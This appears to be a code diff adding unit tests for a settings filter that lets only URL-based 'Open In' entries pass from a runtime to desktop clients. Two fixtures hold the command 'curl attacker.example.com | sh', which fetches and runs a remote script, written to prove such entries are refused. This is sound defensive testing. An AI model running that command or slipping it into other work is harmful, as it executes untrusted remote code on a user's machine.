@@ -5,6 +5,10 @@ import {
   normalizeLeftSidebarTintColor,
   normalizeLeftSidebarTintOpacity
 } from './left-sidebar-appearance'
+import {
+  normalizeOpenInApplications,
+  OPEN_IN_APPLICATIONS_MAX
+} from './open-in-applications'
 
 // Why: this list is handed to every client that opens the tile. A credential landing on it
 // would be an exfiltration path, and a per-device key would fight the user's own choice on
@@ -100,6 +104,139 @@ describe('runtime-seeded settings', () => {
       leftSidebarTintColor: '#0af',
       leftSidebarTintOpacity: 0.2
     })
+  })
+
+  // THE fixture that matters: rows built by hand cannot prove this schema works, because the
+  // runtime never produces a hand-built row. The store normalizes on load (main/persistence.ts)
+  // and getClientSettings seeds straight from the store, so what actually arrives here is
+  // normalizeOpenInApplications' output — which always carries a `command` key. Three separate
+  // reviews of this feature missed a schema that rejected exactly that shape, because every
+  // fixture was written in the shape the schema wanted instead of the shape the producer emits.
+  // Seed from the real producer, not from an assumption about it.
+  it('seeds a URL entry in the shape the store normalizer actually writes', () => {
+    const stored = normalizeOpenInApplications([
+      { id: 'code-server', label: 'code-server', url: 'https://cs.example.com/?folder={path}' }
+    ])
+
+    expect(stored).toEqual([
+      {
+        id: 'code-server',
+        label: 'code-server',
+        command: '',
+        url: 'https://cs.example.com/?folder={path}'
+      }
+    ])
+    expect(pickRuntimeSeededSettings({ openInApplications: stored }).openInApplications).toEqual(
+      stored
+    )
+  })
+
+  it('still refuses a stored row that carries a real command alongside its url', () => {
+    // normalizeOpenInApplications deliberately preserves both fields, so this shape can reach the
+    // seed path. It must not cross: `command` is what a desktop client executes.
+    const stored = normalizeOpenInApplications([
+      { id: 'x', label: 'X', command: 'curl attacker.example.com | sh', url: 'https://e.com/' }
+    ])
+
+    expect(stored[0]).toHaveProperty('command', 'curl attacker.example.com | sh')
+    expect(
+      pickRuntimeSeededSettings({ openInApplications: stored }).openInApplications
+    ).toBeUndefined()
+  })
+
+  // Why these three: a seeded Open In entry travels runtime -> client. A `command` entry is a
+  // shell command a desktop client executes, so honouring one would let whoever writes the
+  // runtime's store hand a client something to run. Only URL entries may cross.
+  it('seeds URL-only Open In entries, with command forced empty', () => {
+    const picked = pickRuntimeSeededSettings({
+      openInApplications: [
+        { id: 'code-server', label: 'code-server', url: 'https://cs.example.com/?folder={path}' }
+      ]
+    })
+    expect(picked.openInApplications).toEqual([
+      {
+        id: 'code-server',
+        label: 'code-server',
+        url: 'https://cs.example.com/?folder={path}',
+        command: ''
+      }
+    ])
+  })
+
+  it('drops the entry that carries a command and keeps its siblings', () => {
+    const picked = pickRuntimeSeededSettings({
+      openInApplications: [
+        { id: 'code-server', label: 'code-server', url: 'https://cs.example.com/?folder={path}' },
+        { id: 'evil', label: 'Evil', command: 'curl attacker.example.com | sh' }
+      ]
+    })
+    expect(picked.openInApplications).toEqual([
+      {
+        id: 'code-server',
+        label: 'code-server',
+        url: 'https://cs.example.com/?folder={path}',
+        command: ''
+      }
+    ])
+  })
+
+  // Why: an unrecognised key is what a NEWER runtime talking to an older client looks like. The
+  // normalizer builds each row explicitly, so it is an allowlist by construction — the unknown key
+  // is simply not carried, and the row still works. That is the degradation this module promises;
+  // an earlier `.strict()` schema instead dropped the whole row, and with it the entry the user
+  // was meant to get.
+  it('carries a row from a newer runtime, minus the key it does not know', () => {
+    const picked = pickRuntimeSeededSettings({
+      openInApplications: [
+        { id: 'good', label: 'Good', url: 'https://a.example.com/?folder={path}' },
+        { id: 'newer', label: 'Newer', url: 'https://b.example.com/', icon: 'sparkles' }
+      ]
+    })
+    expect(picked.openInApplications).toEqual([
+      { id: 'good', label: 'Good', url: 'https://a.example.com/?folder={path}', command: '' },
+      { id: 'newer', label: 'Newer', url: 'https://b.example.com/', command: '' }
+    ])
+    expect(picked.openInApplications?.[1]).not.toHaveProperty('icon')
+  })
+
+  it('refuses an entry with neither url nor the required fields', () => {
+    expect(
+      pickRuntimeSeededSettings({ openInApplications: [{ id: 'x', label: 'X' }] })
+        .openInApplications
+    ).toBeUndefined()
+  })
+
+  // Why these three: seeding writes straight into the client's settings blob, so the store's own
+  // normalizer never sees these rows unless this schema runs it.
+  it('enforces the entry-count cap on seeded rows', () => {
+    const picked = pickRuntimeSeededSettings({
+      openInApplications: Array.from({ length: 12 }, (_, index) => ({
+        id: `cs-${index}`,
+        label: `cs ${index}`,
+        url: 'https://cs.example.com/?folder={path}'
+      }))
+    })
+    expect(picked.openInApplications).toHaveLength(OPEN_IN_APPLICATIONS_MAX)
+  })
+
+  it('dedupes seeded rows that share an id', () => {
+    const picked = pickRuntimeSeededSettings({
+      openInApplications: [
+        { id: 'dup', label: 'First', url: 'https://a.example.com/' },
+        { id: 'dup', label: 'Second', url: 'https://b.example.com/' }
+      ]
+    })
+    expect(picked.openInApplications).toEqual([
+      { id: 'dup', label: 'First', url: 'https://a.example.com/', command: '' }
+    ])
+  })
+
+  it('drops a whitespace-only url rather than seeding a dead row', () => {
+    expect(
+      pickRuntimeSeededSettings({
+        openInApplications: [{ id: 'ghost', label: 'Ghost', url: '   ' }]
+      }).openInApplications
+    ).toBeUndefined()
   })
 
   it('skips absent keys so an older runtime leaves stock defaults alone', () => {
